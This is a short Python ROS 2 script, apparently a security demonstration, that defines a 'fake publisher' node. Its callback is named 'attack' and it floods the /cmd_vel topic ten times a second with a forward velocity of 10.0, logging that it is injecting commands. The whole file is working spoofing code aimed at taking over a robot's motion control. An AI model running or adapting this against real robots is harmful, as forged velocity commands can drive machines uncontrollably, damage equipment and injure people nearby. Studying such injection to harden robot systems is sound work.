import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist

class FakePublisher(Node):
    def __init__(self):
        super().__init__('fake_publisher')
        self.publisher = self.create_publisher(
            Twist,
            '/cmd_vel',
            10
        )
        self.create_timer(0.1, self.attack)
        self.get_logger().warn('😈 Fake publisher injecting /cmd_vel')

    def attack(self):
        msg = Twist()
        msg.linear.x = 10.0
        self.publisher.publish(msg)

def main():
    rclpy.init()
    node = FakePublisher()
    rclpy.spin(node)
    rclpy.shutdown()
